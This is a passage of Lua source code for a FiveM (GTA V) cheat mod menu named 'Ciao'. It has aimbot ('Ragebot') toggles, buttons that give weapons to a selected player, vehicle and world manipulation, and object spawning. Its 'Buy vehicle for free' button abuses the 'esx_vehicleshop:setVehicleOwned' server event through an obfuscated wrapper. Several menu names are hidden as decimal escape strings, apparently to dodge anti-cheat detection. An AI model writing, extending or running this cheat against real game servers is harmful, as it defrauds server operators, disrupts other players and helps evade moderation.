                            Ragebot = not Ragebot
                        end


                -- SPECIFIC WEAPON MENU
                elseif Ciao.IsMenuOpened('\119\101\97\112\111\110\115\112\97\119\110\101\114\10') then
                    if Ciao.MenuButton('Melee Weapons', 'melee') then
                    elseif Ciao.MenuButton('Pistols', 'pistol') then
                    elseif Ciao.MenuButton('SMGs / MGs', 'smg') then
                    elseif Ciao.MenuButton('Shotguns', 'shotgun') then
                    elseif Ciao.MenuButton('Assault Rifles', 'assault') then
                    elseif Ciao.MenuButton('Sniper Rifles', 'sniper') then
                    elseif Ciao.MenuButton('Thrown Weapons', 'thrown') then
                    elseif Ciao.MenuButton('Heavy Weapons', 'heavy') then
                    end

                -- MELEE WEAPON MENU
                elseif Ciao.IsMenuOpened('melee') then
                    for i = 1, #meleeweapons do
                        if Ciao.Button("~r~Â» ~s~"..meleeweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, meleeweapons[i][1])
                        end
                    end
                -- PISTOL MENU
                elseif Ciao.IsMenuOpened('pistol') then
                    for i = 1, #pistolweapons do
                        if Ciao.Button("~r~Â» ~s~"..pistolweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, pistolweapons[i][1])
                        elseif Ciao.Button("Remover ~b~Ammo") then
                            SetPedAmmo(GetPlayerPed(-1), GetHashKey(pistolweapons[i][1]), 0)
                        end
                    end
                -- SMG MENU
                elseif Ciao.IsMenuOpened('smg') then
                    for i = 1, #smgweapons do
                        if Ciao.Button("~r~Â» ~s~"..smgweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, smgweapons[i][1])
                        elseif Ciao.Button("Remover ~b~Ammo") then
                            SetPedAmmo(GetPlayerPed(-1), GetHashKey(smgweapons[i][1]), 0)
                        end
                    end
                -- SHOTGUN MENU
                elseif Ciao.IsMenuOpened('shotgun') then
                    for i = 1, #shotgunweapons do
                        if Ciao.Button("~r~Â» ~s~"..shotgunweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, shotgunweapons[i][1])
                            elseif Ciao.Button("Remover ~b~Ammo") then
                            SetPedAmmo(GetPlayerPed(-1), GetHashKey(shotgunweapons[i][1]), 0)
                        end
                    end
                -- ASSAULT RIFLE MENU
                elseif Ciao.IsMenuOpened('assault') then
                    for i = 1, #assaultweapons do
                        if Ciao.Button("~r~Â» ~s~"..assaultweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, assaultweapons[i][1])
                            elseif Ciao.Button("Remover ~b~Ammo") then
                            SetPedAmmo(GetPlayerPed(-1), GetHashKey(assaultweapons[i][1]), 0)
                        end
                    end
                -- SNIPER MENU
                elseif Ciao.IsMenuOpened('sniper') then
                    for i = 1, #sniperweapons do
                        if Ciao.Button("~r~Â» ~s~"..sniperweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, sniperweapons[i][1])
                            elseif Ciao.Button("Remover ~b~Ammo") then
                            SetPedAmmo(GetPlayerPed(-1), GetHashKey(sniperweapons[i][1]), 0)
                        end
                    end
                -- THROWN WEAPON MENU
                elseif Ciao.IsMenuOpened('thrown') then
                    for i = 1, #thrownweapons do
                        if Ciao.Button("~r~Â» ~s~"..thrownweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, thrownweapons[i][1])
                            elseif Ciao.Button("Remover ~b~Ammo") then
                            SetPedAmmo(GetPlayerPed(-1), GetHashKey(thrownweapons[i][1]), 0)
                        end
                    end
                -- HEAVY WEAPON MENU
                elseif Ciao.IsMenuOpened('heavy') then
                    for i = 1, #heavyweapons do
                        if Ciao.Button("~r~Â» ~s~"..heavyweapons[i][2].."") then
                            GiveWeapon(selectedPlayer, heavyweapons[i][1])
                            elseif Ciao.Button("Remover ~b~Ammo") then
                            SetPedAmmo(GetPlayerPed(-1), GetHashKey(heavyweapons[i][1]), 0)
                        end
                    end


                -- VEHICLE OPTIONS MENU
                elseif Ciao.IsMenuOpened('\118\101\104\105\99\108\101\10') then
                    if Ciao.MenuButton("Vehicle Spawner", '\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10') then
                        elseif Ciao.MenuButton("~r~Vehicle Mods", 'vehiclemods') then
                        elseif Ciao.MenuButton("Vehicle Control Menu", 'vehiclemenu') then
                        elseif Ciao.ComboBox("Vehicle Functions ~y~Â»", {"Repair ~b~Vehicle", "Clean ~g~Vehicle", "Dirty ~c~Vehicle"}, currVFuncIndex, selVFuncIndex, function(currentIndex, selClothingIndex)
                            currVFuncIndex = currentIndex
                            selVFuncIndex = currentIndex
                            end) then
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            RequestControlOnce(veh)
                            if selVFuncIndex == 1 then
                                FixVeh(veh)
                                SetVehicleEngineOn(veh, 1, 1)
                            elseif selVFuncIndex == 2 then
                                SetVehicleDirtLevel(veh, 0)
                            elseif selVFuncIndex == 3 then
                                SetVehicleDirtLevel(veh, 15.0)
                            end
                        elseif Ciao.Button("Buy vehicle for free") then
                        local cb = GetKeyboardInput('Enter Vehicle Spawn Name', '', 100)
                        local cw = GetKeyboardInput('Enter Vehicle Licence Plate', '', 100)
                        if cb and IsModelValid(cb) and IsModelAVehicle(cb) then
                        RequestModel(cb)
                        while not HasModelLoaded(cb) do
                        Citizen.Wait(0)
                        end
                        local veh =
                        CreateVehicle(
                        GetHashKey(cb),
                        GetEntityCoords(PlayerPedId(-1)),
                        GetEntityHeading(PlayerPedId(-1)),
                        true,
                        true
                            )
                            SetVehicleNumberPlateText(veh, cw)
                            local cx = ESX.Game.GetVehicleProperties(veh)
                            udwdj('esx_vehicleshop:setVehicleOwned', cx)
                            ShowInfo('~g~~h~Success', arwet)
                        else
                            ShowInfo('~b~~h~Model is not valid!', true)
                        end
                        elseif Ciao.CheckBox("Drift", driftMode) then
                            driftMode = not driftMode
                        elseif Ciao.Button('Flip Vehicle', '~g~:)))') then
                            SetVehicleOnGroundProperly(GetVehiclePedIsIn(PlayerPedId(), 0))
                        elseif Ciao.Button('Repair Engine', '~g~Thanks Me later.') then
                            local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
        if not DoesEntityExist(veh) then
            drawNotification(
                "You are not sitting in a vehicle mate"
            )
        else
                    SetVehicleUndriveable(veh,false)
                    SetVehicleEngineHealth(veh, 1000.0)
                    SetVehiclePetrolTankHealth(veh, 1000.0)
                    healthEngineLast=1000.0
                    healthPetrolTankLast=1000.0
                        SetVehicleEngineOn(veh, true, false )
                    SetVehicleOilLevel(veh, 1000.0)end
                            
                        elseif Ciao.CheckBox("Collision", Collision) then
                            Collision = not Collision
                        elseif Ciao.ComboBoxSlider("Speed Multiplier", SpeedModOps, currSpeedIndex, selSpeedIndex, function(currentIndex, selectedIndex)
                            currSpeedIndex = currentIndex
                            selSpeedIndex = currentIndex
                            SpeedModAmt = SpeedModOps[currSpeedIndex]

                            if SpeedModAmt == 1.0 then
                                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
                            else
                                SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
                            end
                        end) then
                            elseif Ciao.CheckBox("Easy Handling / Stick To Floor", EasyHandling) then
                            EasyHandling = not EasyHandling
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            if not EasyHandling then
                                SetVehicleGravityAmount(veh, 9.8)
                            else
                                SetVehicleGravityAmount(veh, 30.0)
                            end
                            elseif Ciao.CheckBox("Deadly Bulldozer", DeadlyBulldozer) then
                                DeadlyBulldozer = not DeadlyBulldozer
                                if DeadlyBulldozer then
                                    local veh = SpawnVeh("BULLDOZER", 1, SpawnEngineOn)
                                    SetVehicleCanBreak(veh, not DeadlyBulldozer)
                                    SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
                                    SetVehicleEnginePowerMultiplier(veh, 2500.0)
                                    SetVehicleEngineTorqueMultiplier(veh, 2500.0)
                                    SetVehicleEngineOn(veh, 1, 1, 1)
                                    SetVehicleGravityAmount(veh, 50.0)
                                    SetVehicleColours(veh, 27, 27)
                                    ShowInfo("~r~Go forth and devour thy enemies!\nPress ~w~E ~r~to launch a minion!")
                                elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
                                    DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
                                end
                            end

                -- VEHICLE SPAWNER MENU
                elseif Ciao.IsMenuOpened('\118\101\104\105\99\108\101\115\112\97\119\110\101\114\10') then
                    if Ciao.Button("Spawn Vehicle By Name") then
                        local model = GetKeyboardInput("Enter Model Name:")
                        SpawnVeh(model, PlaceSelf, SpawnEngineOn)
                    elseif Ciao.CheckBox("Put Self Into Spawned Vehicle", PlaceSelf, "No", "Yes") then
                        PlaceSelf = not PlaceSelf
                    elseif Ciao.CheckBox("Spawn Planes In Air", SpawnInAir, "No", "Yes") then
                        SpawnInAir = not SpawnInAir
                    elseif Ciao.CheckBox("Spawn Vehicle With Engine : ", SpawnEngineOn, "No", "Yes") then
                        SpawnEngineOn = not SpawnEngineOn
                    elseif Ciao.MenuButton('Compacts', 'compacts') then
                    elseif Ciao.MenuButton('Sedans', 'sedans') then
                    elseif Ciao.MenuButton('SUVs', 'suvs') then
                    elseif Ciao.MenuButton('Coupes', 'coupes') then
                    elseif Ciao.MenuButton('Muscle', 'muscle') then
                    elseif Ciao.MenuButton('Sports Classics', 'sportsclassics') then
                    elseif Ciao.MenuButton('Sports', 'sports') then
                    elseif Ciao.MenuButton('Super', 'super') then
                    elseif Ciao.MenuButton('Motorcycles', 'motorcycles') then
                    elseif Ciao.MenuButton('Off-Road', 'offroad') then
                    elseif Ciao.MenuButton('Industrial', 'industrial') then
                    elseif Ciao.MenuButton('Utility', 'utility') then
                    elseif Ciao.MenuButton('Vans', 'vans') then
                    elseif Ciao.MenuButton('Cycles', 'cycles') then
                    elseif Ciao.MenuButton('Boats', 'boats') then
                    elseif Ciao.MenuButton('Helicopters', 'helicopters') then
                    elseif Ciao.MenuButton('Planes', 'planes') then
                    elseif Ciao.MenuButton('Service/Emergency/Military', 'service') then
                    elseif Ciao.MenuButton('Commercial/Trains', 'commercial') then
                    end

                -- COMPACTS SPAWNER
                elseif Ciao.IsMenuOpened('compacts') then
                    for i = 1, #compacts do
                        local vehname = GetLabelText(compacts[i])
                        if vehname == "NULL" then vehname = compacts[i] end -- Avoid getting NULL (for some reason GetLabelText returns null for some vehs)
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(compacts[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- SEDANS SPAWNER
                elseif Ciao.IsMenuOpened('sedans') then
                    for i = 1, #sedans do
                        local vehname = GetLabelText(sedans[i])
                        if vehname == "NULL" then vehname = sedans[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(sedans[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- SUVs SPAWNER
                elseif Ciao.IsMenuOpened('suvs') then
                    for i = 1, #suvs do
                        local vehname = GetLabelText(suvs[i])
                        if vehname == "NULL" then vehname = suvs[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(suvs[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- COUPES SPAWNER
                elseif Ciao.IsMenuOpened('coupes') then
                    for i = 1, #coupes do
                        local vehname = GetLabelText(coupes[i])
                        if vehname == "NULL" then vehname = coupes[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(coupes[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- MUSCLE SPAWNER
                elseif Ciao.IsMenuOpened('muscle') then
                    for i = 1, #muscle do
                        local vehname = GetLabelText(muscle[i])
                        if vehname == "NULL" then vehname = muscle[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(muscle[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- SPORTSCLASSICS SPAWNER
                elseif Ciao.IsMenuOpened('sportsclassics') then
                    for i = 1, #sportsclassics do
                        local vehname = GetLabelText(sportsclassics[i])
                        if vehname == "NULL" then vehname = sportsclassics[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(sportsclassics[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- SPORTS SPAWNER
                elseif Ciao.IsMenuOpened('sports') then
                    for i = 1, #sports do
                        local vehname = GetLabelText(sports[i])
                        if vehname == "NULL" then vehname = sports[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(sports[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- SUPER SPAWNER
                elseif Ciao.IsMenuOpened('super') then
                    for i = 1, #super do
                        local vehname = GetLabelText(super[i])
                        if vehname == "NULL" then vehname = super[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(super[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- MOTORCYCLES SPAWNER
                elseif Ciao.IsMenuOpened('motorcycles') then
                    for i = 1, #motorcycles do
                        local vehname = GetLabelText(motorcycles[i])
                        if vehname == "NULL" then vehname = motorcycles[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(motorcycles[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- OFFROAD SPAWNER
                elseif Ciao.IsMenuOpened('offroad') then
                    for i = 1, #offroad do
                        local vehname = GetLabelText(offroad[i])
                        if vehname == "NULL" then vehname = offroad[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(offroad[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- INDUSTRIAL SPAWNER
                elseif Ciao.IsMenuOpened('industrial') then
                    for i = 1, #industrial do
                        local vehname = GetLabelText(industrial[i])
                        if vehname == "NULL" then vehname = industrial[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(industrial[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- UTILITY SPAWNER
                elseif Ciao.IsMenuOpened('utility') then
                    for i = 1, #utility do
                        local vehname = GetLabelText(utility[i])
                        if vehname == "NULL" then vehname = utility[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(utility[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- VANS SPAWNER
                elseif Ciao.IsMenuOpened('vans') then
                    for i = 1, #vans do
                        local vehname = GetLabelText(vans[i])
                        if vehname == "NULL" then vehname = vans[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(vans[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- CYCLES SPAWNER
                elseif Ciao.IsMenuOpened('cycles') then
                    for i = 1, #cycles do
                        local vehname = GetLabelText(cycles[i])
                        if vehname == "NULL" then vehname = cycles[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(cycles[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- BOATS SPAWNER
                elseif Ciao.IsMenuOpened('boats') then
                    for i = 1, #boats do
                        local vehname = GetLabelText(boats[i])
                        if vehname == "NULL" then vehname = boats[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(boats[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- HELICOPTERS SPAWNER
                elseif Ciao.IsMenuOpened('helicopters') then
                    for i = 1, #helicopters do
                        local vehname = GetLabelText(helicopters[i])
                        if vehname == "NULL" then vehname = helicopters[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(helicopters[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- PLANES SPAWNER
                elseif Ciao.IsMenuOpened('planes') then
                    for i = 1, #planes do
                        local vehname = GetLabelText(planes[i])
                        if vehname == "NULL" then vehname = planes[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnPlane(planes[i], PlaceSelf, SpawnInAir)
                        end
                    end

                -- SERVICE SPAWNER
                elseif Ciao.IsMenuOpened('service') then
                    for i = 1, #service do
                        local vehname = GetLabelText(service[i])
                        if vehname == "NULL" then vehname = service[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(service[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- COMMERCIAL SPAWNER
                elseif Ciao.IsMenuOpened('commercial') then
                    for i = 1, #commercial do
                        local vehname = GetLabelText(commercial[i])
                        if vehname == "NULL" then vehname = commercial[i] end
                        local carButton = Ciao.Button(vehname)
                        if carButton then
                            SpawnVeh(commercial[i], PlaceSelf, SpawnEngineOn)
                        end
                    end

                -- VEHICLE MODS MENU
                elseif Ciao.IsMenuOpened('vehiclemods') then
                    if Ciao.MenuButton("Vehicle Colors", 'vehiclecolors') then
                        elseif Ciao.MenuButton("Tune Vehicle", 'vehicletuning') then
                        elseif Ciao.Button("Set Plate Text (8 Characters)") then
                            local plateInput = GetKeyboardInput("Enter Plate Text (8 Characters):")
                            RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
                            SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), plateInput)
                        elseif Ciao.Button("~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Colour") then
                    ra = RGBRainbow(1.0)
                    SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
                    SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId()), ra.r, ra.g, ra.b)
                    elseif Ciao.Button("~h~~r~R~p~a~y~i~m~n~b~b~g~o~o~w ~w~Vehicle Neon") then
                    local u48y34 = RGBRainbow(1.0)
                    local ped = PlayerPedId()
                    local veh = GetVehiclePedIsUsing(ped)
                        SetVehicleNeonLightEnabled(veh, 0, true)
                        SetVehicleNeonLightEnabled(veh, 0, true)
                        SetVehicleNeonLightEnabled(veh, 1, true)
                        SetVehicleNeonLightEnabled(veh, 2, true)
                        SetVehicleNeonLightEnabled(veh, 3, true)
                        SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                    end

                -- VEHICLE COLORS MENU
                elseif Ciao.IsMenuOpened('vehiclecolors') then
                    if Ciao.MenuButton("Primary Color", 'vehiclecolors_primary') then
                        elseif Ciao.MenuButton("Secondary Color", 'vehiclecolors_secondary') then

                    end

                elseif Ciao.IsMenuOpened('vehiclecolors_primary') then
                    if Ciao.MenuButton("Classic Colors", 'primary_classic') then
                        elseif Ciao.MenuButton("Matte Colors", 'primary_matte') then
                        elseif Ciao.MenuButton("Metals", 'primary_metal') then
                    end

                elseif Ciao.IsMenuOpened('vehiclecolors_secondary') then
                    if Ciao.MenuButton("Classic Colors", 'secondary_classic') then
                        elseif Ciao.MenuButton("Matte Colors", 'secondary_matte') then
                        elseif Ciao.MenuButton("Metals", 'secondary_metal') then
                    end

                -- PRIMARY CLASSIC
                elseif Ciao.IsMenuOpened('primary_classic') then
                    for i = 1, #classicColors do
                        if Ciao.Button(classicColors[i][1]) then
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            local prim, sec = GetVehicleColours(veh)
                            SetVehicleColours(veh, classicColors[i][2], sec)
                        end
                    end

                -- PRIMARY MATTE
                elseif Ciao.IsMenuOpened('primary_matte') then
                    for i = 1, #matteColors do
                        if Ciao.Button(matteColors[i][1]) then
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            local prim, sec = GetVehicleColours(veh)
                            SetVehicleColours(veh, matteColors[i][2], sec)
                        end
                    end

                -- PRIMARY METAL
                elseif Ciao.IsMenuOpened('primary_metal') then
                    for i = 1, #metalColors do
                        if Ciao.Button(metalColors[i][1]) then
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            local prim, sec = GetVehicleColours(veh)
                            SetVehicleColours(veh, metalColors[i][2], sec)
                        end
                    end

                -- SECONDARY CLASSIC
                elseif Ciao.IsMenuOpened('secondary_classic') then
                    for i = 1, #classicColors do
                        if Ciao.Button(classicColors[i][1]) then
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            local prim, sec = GetVehicleColours(veh)
                            SetVehicleColours(veh, prim, classicColors[i][2])
                        end
                    end

                -- SECONDARY MATTE
                elseif Ciao.IsMenuOpened('secondary_matte') then
                    for i = 1, #matteColors do
                        if Ciao.Button(matteColors[i][1]) then
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            local prim, sec = GetVehicleColours(veh)
                            SetVehicleColours(veh, prim, matteColors[i][2])
                        end
                    end

                -- SECONDARY METAL
                elseif Ciao.IsMenuOpened('secondary_metal') then
                    for i = 1, #metalColors do
                        if Ciao.Button(metalColors[i][1]) then
                            local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
                            local prim, sec = GetVehicleColours(veh)
                            SetVehicleColours(veh, prim, metalColors[i][2])
                        end
                    end

                -- VEHICLE TUNING MENU
                elseif Ciao.IsMenuOpened('vehicletuning') then
                if Ciao.Button("Max ~r~Exterior Tuning") then
                            MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
                elseif Ciao.Button("Max ~r~Performance") then
                            engine(GetVehiclePedIsUsing(PlayerPedId()))
                elseif Ciao.Button("Max All ~r~Tuning") then
                            engine1(GetVehiclePedIsUsing(PlayerPedId()))
                end


                -- VEHICLE MENU (WIP)
                elseif Ciao.IsMenuOpened('vehiclemenu') then
                    if Ciao.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: "..pvehicleText) then
                        if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
                            SavedVehicle = not SavedVehicle
                            RemoveBlip(pvblip)
                            local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                            pvehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                            pvblip = AddBlipForEntity(pvehicle)
                            SetBlipSprite(pvblip, 225) -- Full list of blips https://marekkraus.sk/gtav/blips/list.html
                            SetBlipColour(pvblip, 84) -- Full list of the available blips colors https://i.imgur.com/Hvyx6cE.png
                            ShowInfo("~g~Current Vehicle Saved")
                            pvehicleText = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(pvehicle))).." "..pvehicle
                        elseif SavedVehicle then
                            SavedVehicle = not SavedVehicle
                            pvehicle = nname
                            RemoveBlip(pvblip)
                            ShowInfo("~b~Saved Vehicle Blip Removed")
                        else
                            ShowInfo("~r~You are not in a vehicle!")
                        end

                        -- Whenever the entity changes, the blip and entity needs to be reseted. Lots of other checks need to be made. (WIP)

                    elseif Ciao.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
                        LeftFrontDoor = not LeftFrontDoor
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if LeftFrontDoor then
                            SetVehicleDoorOpen(vehicle, 0, nname, true)
                        elseif not LeftFrontDoor then
                            SetVehicleDoorShut(vehicle, 0, true)
                        end
                    elseif Ciao.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then -- Is closing when the driver seat has someone
                        RightFrontDoor = not RightFrontDoor
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if RightFrontDoor then
                            SetVehicleDoorOpen(vehicle, 1, nname, true)
                        elseif not RightFrontDoor then
                            SetVehicleDoorShut(vehicle, 1, true)
                        end
                    elseif Ciao.CheckBox("Left Back Door", LeftBackDoor, "Closed", "Opened") then
                        LeftBackDoor = not LeftBackDoor
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if LeftBackDoor then
                            SetVehicleDoorOpen(vehicle, 2, nname, true)
                        elseif not LeftBackDoor then
                            SetVehicleDoorShut(vehicle, 2, true)
                        end
                    elseif Ciao.CheckBox("Right Back Door", RightBackDoor, "Closed", "Opened") then
                        RightBackDoor = not RightBackDoor
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if RightBackDoor then
                            SetVehicleDoorOpen(vehicle, 3, nname, true)
                        elseif not RightBackDoor then
                            SetVehicleDoorShut(vehicle, 3, true)
                        end
                    elseif Ciao.CheckBox("Hood", FrontHood, "Closed", "Opened") then
                        FrontHood = not FrontHood
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if FrontHood then
                            SetVehicleDoorOpen(vehicle, 4, nname, true)
                        elseif not FrontHood then
                            SetVehicleDoorShut(vehicle, 4, true)
                        end
                    elseif Ciao.CheckBox("Trunk", Trunk, "Closed", "Opened") then
                        Trunk = not Trunk
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if Trunk then
                            SetVehicleDoorOpen(vehicle, 5, nname, true)
                        elseif not Trunk then
                            SetVehicleDoorShut(vehicle, 5, true)
                        end
                    elseif Ciao.CheckBox("Back", Back, "Closed", "Opened") then
                        Back = not Back
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if Back then
                            SetVehicleDoorOpen(vehicle, 6, nname, true)
                        elseif not Back then
                            SetVehicleDoorShut(vehicle, 6, true)
                        end
                    elseif Ciao.CheckBox("Back 2", Back2, "Closed", "Opened") then
                        Back2 = not Back2
                        local vehicle = GetVehiclePedIsIn(PlayerPedId(), 0)
                        if Back2 then
                            SetVehicleDoorOpen(vehicle, 7, nname, true)
                        elseif not Back2 then
                            SetVehicleDoorShut(vehicle, 7, true)
                        end
                    end

                -- WORLD OPTIONS MENU
                elseif Ciao.IsMenuOpened('\119\111\114\108\100\10') then
                    if Ciao.MenuButton("Weather Changer ~r~(CLIENT SIDE)", 'weather') then
                    elseif Ciao.MenuButton("Time Changer", 'time') then
                    elseif Ciao.CheckBox("Disable Cars", CarsDisabled) then
                        CarsDisabled = not CarsDisabled
                    elseif Ciao.CheckBox("Disable Guns", GunsDisabled) then
                        GunsDisabled = not GunsDisabled
                    elseif Ciao.CheckBox("Clear Streets", ClearStreets) then
                        ClearStreets = not ClearStreets
                    elseif Ciao.CheckBox("Noisy Cars", NoisyCars) then
                        NoisyCars = not NoisyCars
                        if not NoisyCars then
                            for k in EnumerateVehicles() do
                                SetVehicleAlarmTimeLeft(k, 0)
                            end
                        end
                    elseif Ciao.ComboBoxSlider("Gravity Amount", GravityOpsWords, currGravIndex, selGravIndex, function(currentIndex, selectedIndex)
                        currGravIndex = currentIndex
                        selGravIndex = currentIndex
                        GravAmount = GravityOps[currGravIndex]

                        for k in EnumerateVehicles() do
                            RequestControlOnce(k)
                            SetVehicleGravityAmount(k, GravAmount)
                        end
                    end) then
                    end

                    elseif Ciao.IsMenuOpened('time') then
                    if Ciao.CheckBox("Christmas Weather", XMAS) then
                        XMAS = not XMAS
                        if XMAS then
                                SetForceVehicleTrails(true)
                    SetForcePedFootstepsTracks(true)
                            SetWeatherTypePersist("XMAS")
                SetWeatherTypeNowPersist("XMAS")
                SetWeatherTypeNow("XMAS")
                SetOverrideWeather("XMAS")
                end
                        elseif Ciao.CheckBox("Blizzard Weather", BLIZZARD) then
                        BLIZZARD = not BLIZZARD
                        if BLIZZARD then
                SetWeatherTypePersist("BLIZZARD")
                SetWeatherTypeNowPersist("BLIZZARD")
                SetWeatherTypeNow("BLIZZARD")
                SetOverrideWeather("BLIZZARD")
                end
                elseif Ciao.CheckBox("Foggy Weather", FOGGY) then
                        FOGGY = not FOGGY
                        if FOGGY then
                                        SetWeatherTypePersist("FOGGY")
                SetWeatherTypeNowPersist("FOGGY")
                SetWeatherTypeNow("FOGGY")
                SetOverrideWeather("FOGGY")
                end
            end






                -- OBJECT SPAWNER MENU
                elseif Ciao.IsMenuOpened('\111\98\106\101\99\116\115\112\97\119\110\101\114\10') then
                    if Ciao.MenuButton("Spawned Objects", 'objectlist') then
                    elseif Ciao.ComboBox("~g~Select~s~ To Object~h~~y~ Â»", objs_tospawn, currObjIndex, selObjIndex, function(currentIndex, selectedIndex)
                        currObjIndex = currentIndex
                        selObjIndex = currentIndex
                        obj = objs_tospawn[currObjIndex]
                        end) then
                    elseif Ciao.Button("~g~Spawn ~s~Object") then
                        local pos = GetEntityCoords(PlayerPedId())
                        local pitch = GetEntityPitch(PlayerPedId())
                        local roll = GetEntityRoll(PlayerPedId())
                        local yaw = GetEntityRotation(PlayerPedId()).z
                        local xf = GetEntityForwardX(PlayerPedId())
                        local yf = GetEntityForwardY(PlayerPedId())
                        local spawnedObj = nname
                        if currDirectionIndex == 1 then
                            spawnedObj = CreateObject(GetHashKey(obj), pos.x + (xf * 10), pos.y + (yf * 10), pos.z - 1, 1, 1, 1)
                        elseif currDirectionIndex == 2 then
                            spawnedObj = CreateObject(GetHashKey(obj), pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
                        end
                        SetEntityRotation(spawnedObj, pitch, roll, yaw + ObjRotation)
                        SetEntityVisible(spawnedObj, objVisible, 0)
                        FreezeEntityPosition(spawnedObj, 1)
                        table.insert(SpawnedObjects, spawnedObj)
                    elseif Ciao.Button("Add Object By Name") then
                        local testObj = GetKeyboardInput("Enter Object Model Name:")
                        local pos = GetEntityCoords(PlayerPedId())
                        local addedObj = CreateObject(GetHashKey(testObj), pos.x, pos.y, pos.z - 100, 0, 1, 1)
                        SetEntityVisible(addedObj, 0, 0)
                        if table.contains(objs_tospawn, testObj) then
                            ShowInfo("~b~Model " .. testObj .. " is already spawnable!")
                        elseif DoesEntityExist(addedObj) then
                            objs_tospawn[#objs_tospawn + 1] = testObj
                            ShowInfo("~g~Model " .. testObj .. " has been added to the list!")
                        else
                            ShowInfo("~r~Model " .. testObj .. " does not exist!")
                        end
                        RequestControlOnce(addedObj)
                        DeleteObject(addedObj)
                    elseif Ciao.CheckBox("Visible", objVisible) then
                        objVisible = not objVisible
